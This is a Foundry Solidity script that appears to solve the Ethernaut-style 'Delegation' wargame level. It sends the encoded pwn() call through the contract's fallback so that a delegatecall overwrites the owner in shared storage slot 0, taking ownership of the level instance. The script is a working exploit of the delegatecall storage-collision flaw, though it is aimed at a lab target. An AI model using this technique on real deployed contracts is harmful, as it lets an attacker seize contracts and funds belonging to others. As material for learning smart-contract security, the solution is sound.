// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


/*
    The goal of this level is for you to claim ownership of the instance you are given.

    Encode the pwn() function
    Use fallback() in Delegation to call pwn()
    Stores msg.sender in the storage of Delegation
    This is because Delegate and Delegation share the same storage slot 0 for owner
 */
contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x3c63AbF6131E66Bfca45d936a8f9635E8d3B5431);

    function run() external {

        address player = vm.envAddress("MY_ADDRESS");
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
        console.log(delegationInstance.owner() == player);
    }
}